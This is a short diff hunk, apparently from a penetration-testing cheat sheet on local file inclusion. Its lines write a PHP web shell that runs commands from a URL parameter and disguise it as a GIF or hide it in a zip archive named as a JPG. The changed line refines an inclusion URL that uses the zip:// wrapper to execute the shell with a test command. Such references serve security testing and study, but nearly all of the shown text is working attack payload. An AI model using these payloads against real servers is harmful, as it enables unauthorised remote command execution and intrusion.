@@ -569,7 +569,7 @@ echo 'GIF8<?php system($_GET["cmd"]); ?>' > ok.gif
 
 1- echo '<?php system($_GET["cmd"]); ?>' > ok.php && zip ok.jpg ok.php
 
-2- http://ip/index.php?file=zip://ok.jpg%23ok.php&cmd=id
+2- http://ip/index.php?file=zip://./uploads/ok.jpg%23ok.php&cmd=id
 
 /codes/lfi/ok.jpg
 
